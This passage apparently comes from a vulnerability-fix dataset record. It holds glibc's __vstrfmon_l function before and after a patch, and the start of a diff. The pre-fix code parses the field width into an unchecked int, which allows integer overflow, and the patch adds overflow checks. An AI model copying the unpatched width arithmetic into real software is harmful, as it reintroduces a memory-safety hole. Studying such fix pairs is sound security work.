__set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      p_sign_posn = *_NL_CURRENT (LC_MONETARY, P_SIGN_POSN);\n\t      n_sign_posn = *_NL_CURRENT (LC_MONETARY, N_SIGN_POSN);\n\t      continue;\n\t    case '(':\t\t\t/* Use ( ) for negative sign.  */\n\t      if (n_sign_posn != -1)\n\t\t{\n\t\t  __set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      p_sign_posn = 0;\n\t      n_sign_posn = 0;\n\t      continue;\n\t    case '!':\t\t\t/* Don't print the currency symbol.  */\n\t      print_curr_symbol = 0;\n\t      continue;\n\t    case '-':\t\t\t/* Print left justified.  */\n\t      left = 1;\n\t      continue;\n\t    default:\n\t      /* Will stop the loop.  */;\n\t    }\n\t  break;\n\t}\n\n      if (isdigit (*fmt))\n\t{\n\t  /* Parse field width.  */\n\t  width = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      width *= 10;\n\t      width += to_digit (*fmt);\n\t    }\n\n\t  /* If we don't have enough room for the demanded width we\n\t     can stop now and return an error.  */\n\t  if (dest + width >= s + maxsize)\n\t    {\n\t      __set_errno (E2BIG);\n\t      return -1;\n\t    }\n\t}\n\n      /* Recognize left precision.  */\n      if (*fmt == '#')\n\t{\n\t  if (!isdigit (*++fmt))\n\t    {\n\t      __set_errno (EINVAL);\n\t      return -1;\n\t    }\n\t  left_prec = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      left_prec *= 10;\n\t      left_prec += to_digit (*fmt);\n\t    }\n\t}\n\n      /* Recognize right precision.  */\n      if (*fmt == '.')\n\t{\n\t  if (!isdigit (*++fmt))\n\t    {\n\t      __set_errno (EINVAL);\n\t      return -1;\n\t    }\n\t  right_prec = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      right_prec *= 10;\n\t      right_prec += to_digit (*fmt);\n\t    }\n\t}\n\n      /* Handle modifier.  This is an extension.  */\n      if (*fmt == 'L')\n\t{\n\t  ++fmt;\n\t  if (!__ldbl_is_dbl)\n\t    is_long_double = 1;\n\t}\n\n      /* Handle format specifier.  */\n      char int_symbol[4];\n      switch (*fmt++)\n\t{\n\tcase 'i': {\t\t/* Use international currency symbol.  */\n\t  const char *int_curr_symbol;\n\n\t  int_curr_symbol = _NL_CURRENT (LC_MONETARY, INT_CURR_SYMBOL);\n\t  strncpy(int_symbol, int_curr_symbol, 3);\n\t  int_symbol[3] = '\\0';\n\n\t  currency_symbol_len = 3;\n\t  currency_symbol = &int_symbol[0];\n\t  space_char = int_curr_symbol[3];\n\t  int_format = 1;\n\t  break;\n\t}\n\tcase 'n':\t\t/* Use national currency symbol.  */\n\t  currency_symbol = _NL_CURRENT (LC_MONETARY, CURRENCY_SYMBOL);\n\t  currency_symbol_len = strlen (currency_symbol);\n\t  space_char = ' ';\n\t  int_format = 0;\n\t  break;\n\tdefault:\t\t/* Any unrecognized format is an error.  */\n\t  __set_errno (EINVAL);\n\t  return -1;\n\t}\n\n      /* If not specified by the format string now find the values for\n\t the format specification.  */\n      if (p_sign_posn == -1)\n\tp_sign_posn = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SIGN_POSN : P_SIGN_POSN);\n      if (n_sign_posn == -1)\n\tn_sign_posn = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SIGN_POSN : N_SIGN_POSN);\n\n      if (right_prec == -1)\n\t{\n\t  right_prec = *_NL_CURRENT (LC_MONETARY, int_format ? INT_FRAC_DIGITS : FRAC_DIGITS);\n\n\t  if (right_prec == CHAR_MAX)\n\t    right_prec = 2;\n\t}\n\n      /* If we have to print the digits grouped determine how many\n\t extra characters this means.  */\n      if (group && left_prec != -1)\n\tleft_prec += __guess_grouping (left_prec,\n\t\t\t\t       _NL_CURRENT (LC_MONETARY, MON_GROUPING),\n\t\t\t\t       *_NL_CURRENT (LC_MONETARY,\n\t\t\t\t\t\t     MON_THOUSANDS_SEP));\n\n      /* Now it's time to get the value.  */\n      if (is_long_double == 1)\n\t{\n\t  fpnum.ldbl = va_arg (ap, long double);\n\t  is_negative = fpnum.ldbl < 0;\n\t  if (is_negative)\n\t    fpnum.ldbl = -fpnum.ldbl;\n\t}\n      else\n\t{\n\t  fpnum.dbl = va_arg (ap, double);\n\t  is_negative = fpnum.dbl < 0;\n\t  if (is_negative)\n\t    fpnum.dbl = -fpnum.dbl;\n\t}\n\n      /* We now know the sign of the value and can determine the format.  */\n      if (is_negative)\n\t{\n\t  sign_string = _NL_CURRENT (LC_MONETARY, NEGATIVE_SIGN);\n\t  /* If the locale does not specify a character for the\n\t     negative sign we use a '-'.  */\n\t  if (*sign_string == '\\0')\n\t    sign_string = (const char *) \"-\";\n\t  cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_CS_PRECEDES : N_CS_PRECEDES);\n\t  sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SEP_BY_SPACE : N_SEP_BY_SPACE);\n\t  sign_posn = n_sign_posn;\n\n\t  other_sign_string = _NL_CURRENT (LC_MONETARY, POSITIVE_SIGN);\n\t  other_cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_CS_PRECEDES : P_CS_PRECEDES);\n\t  other_sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SEP_BY_SPACE : P_SEP_BY_SPACE);\n\t  other_sign_posn = p_sign_posn;\n\t}\n      else\n\t{\n\t  sign_string = _NL_CURRENT (LC_MONETARY, POSITIVE_SIGN);\n\t  cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_CS_PRECEDES : P_CS_PRECEDES);\n\t  sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SEP_BY_SPACE : P_SEP_BY_SPACE);\n\t  sign_posn = p_sign_posn;\n\n\t  other_sign_string = _NL_CURRENT (LC_MONETARY, NEGATIVE_SIGN);\n\t  if (*other_sign_string == '\\0')\n\t    other_sign_string = (const char *) \"-\";\n\t  other_cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_CS_PRECEDES : N_CS_PRECEDES);\n\t  other_sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SEP_BY_SPACE : N_SEP_BY_SPACE);\n\t  other_sign_posn = n_sign_posn;\n\t}\n\n      /* Set default values for unspecified information.  */\n      if (cs_precedes != 0)\n\tcs_precedes = 1;\n      if (other_cs_precedes != 0)\n\tother_cs_precedes = 1;\n      if (sep_by_space == CHAR_MAX)\n\tsep_by_space = 0;\n      if (other_sep_by_space == CHAR_MAX)\n\tother_sep_by_space = 0;\n      if (sign_posn == CHAR_MAX)\n\tsign_posn = 1;\n      if (other_sign_posn == CHAR_MAX)\n\tother_sign_posn = 1;\n\n      /* Check for degenerate cases */\n      if (sep_by_space == 2)\n\t{\n\t  if (sign_posn == 0 ||\n\t      (sign_posn == 1 && !cs_precedes) ||\n\t      (sign_posn == 2 && cs_precedes))\n\t    /* sign and symbol are not adjacent, so no separator */\n\t    sep_by_space = 0;\n\t}\n      if (other_sep_by_space == 2)\n\t{\n\t  if (other_sign_posn == 0 ||\n\t      (other_sign_posn == 1 && !other_cs_precedes) ||\n\t      (other_sign_posn == 2 && other_cs_precedes))\n\t    /* sign and symbol are not adjacent, so no separator */\n\t    other_sep_by_space = 0;\n\t}\n\n      /* Set the left precision and padding needed for alignment */\n      if (left_prec == -1)\n\t{\n\t  left_prec = 0;\n\t  left_pad = 0;\n\t}\n      else\n\t{\n\t  /* Set left_pad to number of spaces needed to align positive\n\t     and negative formats */\n\n\t  int left_bytes = 0;\n\t  int other_left_bytes = 0;\n\n\t  /* Work out number of bytes for currency string and separator\n\t     preceding the value */\n\t  if (cs_precedes)\n\t    {\n\t      left_bytes += currency_symbol_len;\n\t      if (sep_by_space != 0)\n\t\t++left_bytes;\n\t    }\n\n\t  if (other_cs_precedes)\n\t    {\n\t      other_left_bytes += currency_symbol_len;\n\t      if (other_sep_by_space != 0)\n\t\t++other_left_bytes;\n\t    }\n\n\t  /* Work out number of bytes for the sign (or left parenthesis)\n\t     preceding the value */\n\t  if (sign_posn == 0 && is_negative)\n\t    ++left_bytes;\n\t  else if (sign_posn == 1)\n\t    left_bytes += strlen (sign_string);\n\t  else if (cs_precedes && (sign_posn == 3 || sign_posn == 4))\n\t    left_bytes += strlen (sign_string);\n\n\t  if (other_sign_posn == 0 && !is_negative)\n\t    ++other_left_bytes;\n\t  else if (other_sign_posn == 1)\n\t    other_left_bytes += strlen (other_sign_string);\n\t  else if (other_cs_precedes &&\n\t\t   (other_sign_posn == 3 || other_sign_posn == 4))\n\t    other_left_bytes += strlen (other_sign_string);\n\n\t  /* Compare the number of bytes preceding the value for\n\t     each format, and set the padding accordingly */\n\t  if (other_left_bytes > left_bytes)\n\t    left_pad = other_left_bytes - left_bytes;\n\t  else\n\t    left_pad = 0;\n\t}\n\n      /* Perhaps we'll someday make these things configurable so\n\t better start using symbolic names now.  */\n#define left_paren '('\n#define right_paren ')'\n\n      startp = dest;\t\t/* Remember start so we can compute length.  */\n\n      while (left_pad-- > 0)\n\tout_char (' ');\n\n      if (sign_posn == 0 && is_negative)\n\tout_char (left_paren);\n\n      if (cs_precedes)\n\t{\n\t  if (sign_posn != 0 && sign_posn != 2 && sign_posn != 4\n\t      && sign_posn != 5)\n\t    {\n\t      out_string (sign_string);\n\t      if (sep_by_space == 2)\n\t\tout_char (' ');\n\t    }\n\n\t  if (print_curr_symbol)\n\t    out_string (currency_symbol);\n\n\t  if (sign_posn == 4)\n\t    {\n\t      if (print_curr_symbol && sep_by_space == 2)\n\t\tout_char (space_char);\n\t      out_string (sign_string);\n\t      if (sep_by_space == 1)\n\t\t/* POSIX.2 and SUS are not clear on this case, but C99\n\t\t   says a space follows the adjacent-symbol-and-sign */\n\t\tout_char (' ');\n\t    }\n\t  else\n\t    if (print_curr_symbol && sep_by_space == 1)\n\t      out_char (space_char);\n\t}\n      else\n\tif (sign_posn != 0 && sign_posn != 2 && sign_posn != 3\n\t    && sign_posn != 4 && sign_posn != 5)\n\t  out_string (sign_string);\n\n      /* Print the number.  */\n#ifdef _IO_MTSAFE_IO\n      f._sbf._f._lock = &lock;\n#endif\n      INTUSE(_IO_init) ((_IO_FILE *) &f, 0);\n      _IO_JUMPS ((struct _IO_FILE_plus *) &f) = &_IO_str_jumps;\n      INTUSE(_IO_str_init_static) ((_IO_strfile *) &f, dest,\n\t\t\t\t   (s + maxsize) - dest, dest);\n      /* We clear the last available byte so we can find out whether\n\t the numeric representation is too long.  */\n      s[maxsize - 1] = '\\0';\n\n      memset (&info, '\\0', sizeof (info));\n      info.prec = right_prec;\n      info.width = left_prec + (right_prec ? (right_prec + 1) : 0);\n      info.spec = 'f';\n      info.is_long_double = is_long_double;\n      info.group = group;\n      info.pad = pad;\n      info.extra = 1;\t\t/* This means use values from LC_MONETARY.  */\n\n      ptr = &fpnum;\n      done = __printf_fp ((FILE *) &f, &info, &ptr);\n      if (done < 0)\n\treturn -1;\n\n      if (s[maxsize - 1] != '\\0')\n\t{\n\t  __set_errno (E2BIG);\n\t  return -1;\n\t}\n\n      dest += done;\n\n      if (!cs_precedes)\n\t{\n\t  if (sign_posn == 3)\n\t    {\n\t      if (sep_by_space == 1)\n\t\tout_char (' ');\n\t      out_string (sign_string);\n\t    }\n\n\t  if (print_curr_symbol)\n\t    {\n\t      if ((sign_posn == 3 && sep_by_space == 2)\n\t\t  || (sign_posn == 4 && sep_by_space == 1)\n\t\t  || (sign_posn == 2 && sep_by_space == 1)\n\t\t  || (sign_posn == 1 && sep_by_space == 1)\n\t\t  || (sign_posn == 0 && sep_by_space == 1))\n\t\tout_char (space_char);\n\t      out_nstring (currency_symbol, currency_symbol_len);\n\t    }\n\t    \n\t  if (sign_posn == 4)\n\t    {\n\t      if (sep_by_space == 2)\n\t\tout_char (' ');\n\t      out_string (sign_string);\n\t    }\n\t}\n\n      if (sign_posn == 2)\n\t{\n\t  if (sep_by_space == 2)\n\t    out_char (' ');\n\t  out_string (sign_string);\n\t}\n\n      if (sign_posn == 0 && is_negative)\n\tout_char (right_paren);\n\n      /* Now test whether the output width is filled.  */\n      if (dest - startp < width)\n\t{\n\t  if (left)\n\t    /* We simply have to fill using spaces.  */\n\t    do\n\t      out_char (' ');\n\t    while (dest - startp < width);\n\t  else\n\t    {\n\t      int dist = width - (dest - startp);\n\t      char *cp;\n\t      for (cp = dest - 1; cp >= startp; --cp)\n\t\tcp[dist] = cp[0];\n\n\t      dest += dist;\n\n\t      do\n\t\tstartp[--dist] = ' ';\n\t      while (dist > 0);\n\t    }\n\t}\n    }\n\n  /* Terminate the string.  */\n  *dest = '\\0';\n\n  return dest - s;\n}",
        "func": "ssize_t\n__vstrfmon_l (char *s, size_t maxsize, __locale_t loc, const char *format,\n\t      va_list ap)\n{\n  struct locale_data *current = loc->__locales[LC_MONETARY];\n  _IO_strfile f;\n#ifdef _IO_MTSAFE_IO\n  _IO_lock_t lock;\n#endif\n  struct printf_info info;\n  char *dest;\t\t\t/* Pointer so copy the output.  */\n  const char *fmt;\t\t/* Pointer that walks through format.  */\n\n  dest = s;\n  fmt = format;\n\n  /* Loop through the format-string.  */\n  while (*fmt != '\\0')\n    {\n      /* The floating-point value to output.  */\n      union\n      {\n\tdouble dbl;\n\t__long_double_t ldbl;\n      }\n      fpnum;\n      int int_format;\n      int print_curr_symbol;\n      int left_prec;\n      int left_pad;\n      int right_prec;\n      int group;\n      char pad;\n      int is_long_double;\n      int p_sign_posn;\n      int n_sign_posn;\n      int sign_posn;\n      int other_sign_posn;\n      int left;\n      int is_negative;\n      int sep_by_space;\n      int other_sep_by_space;\n      int cs_precedes;\n      int other_cs_precedes;\n      const char *sign_string;\n      const char *other_sign_string;\n      int done;\n      const char *currency_symbol;\n      size_t currency_symbol_len;\n      long int width;\n      char *startp;\n      const void *ptr;\n      char space_char;\n\n      /* Process all character which do not introduce a format\n\t specification.  */\n      if (*fmt != '%')\n\t{\n\t  out_char (*fmt++);\n\t  continue;\n\t}\n\n      /* \"%%\" means a single '%' character.  */\n      if (fmt[1] == '%')\n\t{\n\t  out_char (*++fmt);\n\t  ++fmt;\n\t  continue;\n\t}\n\n      /* Defaults for formatting.  */\n      int_format = 0;\t\t\t/* Use international curr. symbol */\n      print_curr_symbol = 1;\t\t/* Print the currency symbol.  */\n      left_prec = -1;\t\t\t/* No left precision specified.  */\n      right_prec = -1;\t\t\t/* No right precision specified.  */\n      group = 1;\t\t\t/* Print digits grouped.  */\n      pad = ' ';\t\t\t/* Fill character is <SP>.  */\n      is_long_double = 0;\t\t/* Double argument by default.  */\n      p_sign_posn = -1;\t\t\t/* This indicates whether the */\n      n_sign_posn = -1;\t\t\t/* '(' flag is given.  */\n      width = -1;\t\t\t/* No width specified so far.  */\n      left = 0;\t\t\t\t/* Right justified by default.  */\n\n      /* Parse group characters.  */\n      while (1)\n\t{\n\t  switch (*++fmt)\n\t    {\n\t    case '=':\t\t\t/* Set fill character.  */\n\t      pad = *++fmt;\n\t      if (pad == '\\0')\n\t\t{\n\t\t  /* Premature EOS.  */\n\t\t  __set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      continue;\n\t    case '^':\t\t\t/* Don't group digits.  */\n\t      group = 0;\n\t      continue;\n\t    case '+':\t\t\t/* Use +/- for sign of number.  */\n\t      if (n_sign_posn != -1)\n\t\t{\n\t\t  __set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      p_sign_posn = *_NL_CURRENT (LC_MONETARY, P_SIGN_POSN);\n\t      n_sign_posn = *_NL_CURRENT (LC_MONETARY, N_SIGN_POSN);\n\t      continue;\n\t    case '(':\t\t\t/* Use ( ) for negative sign.  */\n\t      if (n_sign_posn != -1)\n\t\t{\n\t\t  __set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      p_sign_posn = 0;\n\t      n_sign_posn = 0;\n\t      continue;\n\t    case '!':\t\t\t/* Don't print the currency symbol.  */\n\t      print_curr_symbol = 0;\n\t      continue;\n\t    case '-':\t\t\t/* Print left justified.  */\n\t      left = 1;\n\t      continue;\n\t    default:\n\t      /* Will stop the loop.  */;\n\t    }\n\t  break;\n\t}\n\n      if (isdigit (*fmt))\n\t{\n\t  /* Parse field width.  */\n\t  width = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      int val = to_digit (*fmt);\n\n\t      if (width > LONG_MAX / 10\n\t\t  || (width == LONG_MAX && val > LONG_MAX % 10))\n\t\t{\n\t\t  __set_errno (E2BIG);\n\t\t  return -1;\n\t\t}\n\n\t      width = width * 10 + val;\n\t    }\n\n\t  /* If we don't have enough room for the demanded width we\n\t     can stop now and return an error.  */\n\t  if (width >= maxsize - (dest - s))\n\t    {\n\t      __set_errno (E2BIG);\n\t      return -1;\n\t    }\n\t}\n\n      /* Recognize left precision.  */\n      if (*fmt == '#')\n\t{\n\t  if (!isdigit (*++fmt))\n\t    {\n\t      __set_errno (EINVAL);\n\t      return -1;\n\t    }\n\t  left_prec = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      left_prec *= 10;\n\t      left_prec += to_digit (*fmt);\n\t    }\n\t}\n\n      /* Recognize right precision.  */\n      if (*fmt == '.')\n\t{\n\t  if (!isdigit (*++fmt))\n\t    {\n\t      __set_errno (EINVAL);\n\t      return -1;\n\t    }\n\t  right_prec = to_digit (*fmt);\n\n\t  while (isdigit (*++fmt))\n\t    {\n\t      right_prec *= 10;\n\t      right_prec += to_digit (*fmt);\n\t    }\n\t}\n\n      /* Handle modifier.  This is an extension.  */\n      if (*fmt == 'L')\n\t{\n\t  ++fmt;\n\t  if (!__ldbl_is_dbl)\n\t    is_long_double = 1;\n\t}\n\n      /* Handle format specifier.  */\n      char int_symbol[4];\n      switch (*fmt++)\n\t{\n\tcase 'i': {\t\t/* Use international currency symbol.  */\n\t  const char *int_curr_symbol;\n\n\t  int_curr_symbol = _NL_CURRENT (LC_MONETARY, INT_CURR_SYMBOL);\n\t  strncpy(int_symbol, int_curr_symbol, 3);\n\t  int_symbol[3] = '\\0';\n\n\t  currency_symbol_len = 3;\n\t  currency_symbol = &int_symbol[0];\n\t  space_char = int_curr_symbol[3];\n\t  int_format = 1;\n\t  break;\n\t}\n\tcase 'n':\t\t/* Use national currency symbol.  */\n\t  currency_symbol = _NL_CURRENT (LC_MONETARY, CURRENCY_SYMBOL);\n\t  currency_symbol_len = strlen (currency_symbol);\n\t  space_char = ' ';\n\t  int_format = 0;\n\t  break;\n\tdefault:\t\t/* Any unrecognized format is an error.  */\n\t  __set_errno (EINVAL);\n\t  return -1;\n\t}\n\n      /* If not specified by the format string now find the values for\n\t the format specification.  */\n      if (p_sign_posn == -1)\n\tp_sign_posn = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SIGN_POSN : P_SIGN_POSN);\n      if (n_sign_posn == -1)\n\tn_sign_posn = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SIGN_POSN : N_SIGN_POSN);\n\n      if (right_prec == -1)\n\t{\n\t  right_prec = *_NL_CURRENT (LC_MONETARY, int_format ? INT_FRAC_DIGITS : FRAC_DIGITS);\n\n\t  if (right_prec == CHAR_MAX)\n\t    right_prec = 2;\n\t}\n\n      /* If we have to print the digits grouped determine how many\n\t extra characters this means.  */\n      if (group && left_prec != -1)\n\tleft_prec += __guess_grouping (left_prec,\n\t\t\t\t       _NL_CURRENT (LC_MONETARY, MON_GROUPING),\n\t\t\t\t       *_NL_CURRENT (LC_MONETARY,\n\t\t\t\t\t\t     MON_THOUSANDS_SEP));\n\n      /* Now it's time to get the value.  */\n      if (is_long_double == 1)\n\t{\n\t  fpnum.ldbl = va_arg (ap, long double);\n\t  is_negative = fpnum.ldbl < 0;\n\t  if (is_negative)\n\t    fpnum.ldbl = -fpnum.ldbl;\n\t}\n      else\n\t{\n\t  fpnum.dbl = va_arg (ap, double);\n\t  is_negative = fpnum.dbl < 0;\n\t  if (is_negative)\n\t    fpnum.dbl = -fpnum.dbl;\n\t}\n\n      /* We now know the sign of the value and can determine the format.  */\n      if (is_negative)\n\t{\n\t  sign_string = _NL_CURRENT (LC_MONETARY, NEGATIVE_SIGN);\n\t  /* If the locale does not specify a character for the\n\t     negative sign we use a '-'.  */\n\t  if (*sign_string == '\\0')\n\t    sign_string = (const char *) \"-\";\n\t  cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_CS_PRECEDES : N_CS_PRECEDES);\n\t  sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SEP_BY_SPACE : N_SEP_BY_SPACE);\n\t  sign_posn = n_sign_posn;\n\n\t  other_sign_string = _NL_CURRENT (LC_MONETARY, POSITIVE_SIGN);\n\t  other_cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_CS_PRECEDES : P_CS_PRECEDES);\n\t  other_sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SEP_BY_SPACE : P_SEP_BY_SPACE);\n\t  other_sign_posn = p_sign_posn;\n\t}\n      else\n\t{\n\t  sign_string = _NL_CURRENT (LC_MONETARY, POSITIVE_SIGN);\n\t  cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_CS_PRECEDES : P_CS_PRECEDES);\n\t  sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_P_SEP_BY_SPACE : P_SEP_BY_SPACE);\n\t  sign_posn = p_sign_posn;\n\n\t  other_sign_string = _NL_CURRENT (LC_MONETARY, NEGATIVE_SIGN);\n\t  if (*other_sign_string == '\\0')\n\t    other_sign_string = (const char *) \"-\";\n\t  other_cs_precedes = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_CS_PRECEDES : N_CS_PRECEDES);\n\t  other_sep_by_space = *_NL_CURRENT (LC_MONETARY, int_format ? INT_N_SEP_BY_SPACE : N_SEP_BY_SPACE);\n\t  other_sign_posn = n_sign_posn;\n\t}\n\n      /* Set default values for unspecified information.  */\n      if (cs_precedes != 0)\n\tcs_precedes = 1;\n      if (other_cs_precedes != 0)\n\tother_cs_precedes = 1;\n      if (sep_by_space == CHAR_MAX)\n\tsep_by_space = 0;\n      if (other_sep_by_space == CHAR_MAX)\n\tother_sep_by_space = 0;\n      if (sign_posn == CHAR_MAX)\n\tsign_posn = 1;\n      if (other_sign_posn == CHAR_MAX)\n\tother_sign_posn = 1;\n\n      /* Check for degenerate cases */\n      if (sep_by_space == 2)\n\t{\n\t  if (sign_posn == 0 ||\n\t      (sign_posn == 1 && !cs_precedes) ||\n\t      (sign_posn == 2 && cs_precedes))\n\t    /* sign and symbol are not adjacent, so no separator */\n\t    sep_by_space = 0;\n\t}\n      if (other_sep_by_space == 2)\n\t{\n\t  if (other_sign_posn == 0 ||\n\t      (other_sign_posn == 1 && !other_cs_precedes) ||\n\t      (other_sign_posn == 2 && other_cs_precedes))\n\t    /* sign and symbol are not adjacent, so no separator */\n\t    other_sep_by_space = 0;\n\t}\n\n      /* Set the left precision and padding needed for alignment */\n      if (left_prec == -1)\n\t{\n\t  left_prec = 0;\n\t  left_pad = 0;\n\t}\n      else\n\t{\n\t  /* Set left_pad to number of spaces needed to align positive\n\t     and negative formats */\n\n\t  int left_bytes = 0;\n\t  int other_left_bytes = 0;\n\n\t  /* Work out number of bytes for currency string and separator\n\t     preceding the value */\n\t  if (cs_precedes)\n\t    {\n\t      left_bytes += currency_symbol_len;\n\t      if (sep_by_space != 0)\n\t\t++left_bytes;\n\t    }\n\n\t  if (other_cs_precedes)\n\t    {\n\t      other_left_bytes += currency_symbol_len;\n\t      if (other_sep_by_space != 0)\n\t\t++other_left_bytes;\n\t    }\n\n\t  /* Work out number of bytes for the sign (or left parenthesis)\n\t     preceding the value */\n\t  if (sign_posn == 0 && is_negative)\n\t    ++left_bytes;\n\t  else if (sign_posn == 1)\n\t    left_bytes += strlen (sign_string);\n\t  else if (cs_precedes && (sign_posn == 3 || sign_posn == 4))\n\t    left_bytes += strlen (sign_string);\n\n\t  if (other_sign_posn == 0 && !is_negative)\n\t    ++other_left_bytes;\n\t  else if (other_sign_posn == 1)\n\t    other_left_bytes += strlen (other_sign_string);\n\t  else if (other_cs_precedes &&\n\t\t   (other_sign_posn == 3 || other_sign_posn == 4))\n\t    other_left_bytes += strlen (other_sign_string);\n\n\t  /* Compare the number of bytes preceding the value for\n\t     each format, and set the padding accordingly */\n\t  if (other_left_bytes > left_bytes)\n\t    left_pad = other_left_bytes - left_bytes;\n\t  else\n\t    left_pad = 0;\n\t}\n\n      /* Perhaps we'll someday make these things configurable so\n\t better start using symbolic names now.  */\n#define left_paren '('\n#define right_paren ')'\n\n      startp = dest;\t\t/* Remember start so we can compute length.  */\n\n      while (left_pad-- > 0)\n\tout_char (' ');\n\n      if (sign_posn == 0 && is_negative)\n\tout_char (left_paren);\n\n      if (cs_precedes)\n\t{\n\t  if (sign_posn != 0 && sign_posn != 2 && sign_posn != 4\n\t      && sign_posn != 5)\n\t    {\n\t      out_string (sign_string);\n\t      if (sep_by_space == 2)\n\t\tout_char (' ');\n\t    }\n\n\t  if (print_curr_symbol)\n\t    out_string (currency_symbol);\n\n\t  if (sign_posn == 4)\n\t    {\n\t      if (print_curr_symbol && sep_by_space == 2)\n\t\tout_char (space_char);\n\t      out_string (sign_string);\n\t      if (sep_by_space == 1)\n\t\t/* POSIX.2 and SUS are not clear on this case, but C99\n\t\t   says a space follows the adjacent-symbol-and-sign */\n\t\tout_char (' ');\n\t    }\n\t  else\n\t    if (print_curr_symbol && sep_by_space == 1)\n\t      out_char (space_char);\n\t}\n      else\n\tif (sign_posn != 0 && sign_posn != 2 && sign_posn != 3\n\t    && sign_posn != 4 && sign_posn != 5)\n\t  out_string (sign_string);\n\n      /* Print the number.  */\n#ifdef _IO_MTSAFE_IO\n      f._sbf._f._lock = &lock;\n#endif\n      INTUSE(_IO_init) ((_IO_FILE *) &f, 0);\n      _IO_JUMPS ((struct _IO_FILE_plus *) &f) = &_IO_str_jumps;\n      INTUSE(_IO_str_init_static) ((_IO_strfile *) &f, dest,\n\t\t\t\t   (s + maxsize) - dest, dest);\n      /* We clear the last available byte so we can find out whether\n\t the numeric representation is too long.  */\n      s[maxsize - 1] = '\\0';\n\n      memset (&info, '\\0', sizeof (info));\n      info.prec = right_prec;\n      info.width = left_prec + (right_prec ? (right_prec + 1) : 0);\n      info.spec = 'f';\n      info.is_long_double = is_long_double;\n      info.group = group;\n      info.pad = pad;\n      info.extra = 1;\t\t/* This means use values from LC_MONETARY.  */\n\n      ptr = &fpnum;\n      done = __printf_fp ((FILE *) &f, &info, &ptr);\n      if (done < 0)\n\treturn -1;\n\n      if (s[maxsize - 1] != '\\0')\n\t{\n\t  __set_errno (E2BIG);\n\t  return -1;\n\t}\n\n      dest += done;\n\n      if (!cs_precedes)\n\t{\n\t  if (sign_posn == 3)\n\t    {\n\t      if (sep_by_space == 1)\n\t\tout_char (' ');\n\t      out_string (sign_string);\n\t    }\n\n\t  if (print_curr_symbol)\n\t    {\n\t      if ((sign_posn == 3 && sep_by_space == 2)\n\t\t  || (sign_posn == 4 && sep_by_space == 1)\n\t\t  || (sign_posn == 2 && sep_by_space == 1)\n\t\t  || (sign_posn == 1 && sep_by_space == 1)\n\t\t  || (sign_posn == 0 && sep_by_space == 1))\n\t\tout_char (space_char);\n\t      out_nstring (currency_symbol, currency_symbol_len);\n\t    }\n\n\t  if (sign_posn == 4)\n\t    {\n\t      if (sep_by_space == 2)\n\t\tout_char (' ');\n\t      out_string (sign_string);\n\t    }\n\t}\n\n      if (sign_posn == 2)\n\t{\n\t  if (sep_by_space == 2)\n\t    out_char (' ');\n\t  out_string (sign_string);\n\t}\n\n      if (sign_posn == 0 && is_negative)\n\tout_char (right_paren);\n\n      /* Now test whether the output width is filled.  */\n      if (dest - startp < width)\n\t{\n\t  if (left)\n\t    /* We simply have to fill using spaces.  */\n\t    do\n\t      out_char (' ');\n\t    while (dest - startp < width);\n\t  else\n\t    {\n\t      long int dist = width - (dest - startp);\n\t      for (char *cp = dest - 1; cp >= startp; --cp)\n\t\tcp[dist] = cp[0];\n\n\t      dest += dist;\n\n\t      do\n\t\tstartp[--dist] = ' ';\n\t      while (dist > 0);\n\t    }\n\t}\n    }\n\n  /* Terminate the string.  */\n  *dest = '\\0';\n\n  return dest - s;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -47,7 +47,7 @@\n       int done;\n       const char *currency_symbol;\n       size_t currency_symbol_len;\n-      int width;\n+      long int width;\n       char *startp;\n       const void *ptr;\n       char space_char;\n@@ -135,13 +135,21 @@\n \n \t  while (isdigit (*++fmt))\n \t    {\n-\t      width *= 10;\n-\t      width += to_digit (*fmt);\n+\t      int val = to_digit (*fmt);\n+\n+\t      if (width > LONG_MAX / 10\n+\t\t  || (width == LONG_MAX && val > LONG_MAX % 10))\n+\t\t{\n+\t\t  __set_errno (E2BIG);\n+\t\t  return -1;\n+\t\t}\n+\n+\t      width = width * 10 + val;\n \t    }\n \n \t  /* If we don't have enough room for the demanded width we\n \t     can stop now and return an error.  */\n-\t  if (dest + width >= s + maxsize)\n+\t  if (width >= maxsize - (dest - s))\n \t    {\n \t      __set_errno (E2BIG);\n \t      return -1;\n@@ -474,7 +482,7 @@\n \t\tout_char (space_char);\n \t      out_nstring (currency_symbol, currency_symbol_len);\n \t    }\n-\t    \n+\n \t  if (sign_posn == 4)\n \t    {\n \t      if (sep_by_space == 2)\n@@ -503,9 +511,8 @@\n \t    while (dest - startp < width);\n \t  else\n \t    {\n-\t      int dist = width - (dest - startp);\n-\t      char *cp;\n-\t      for (cp = dest - 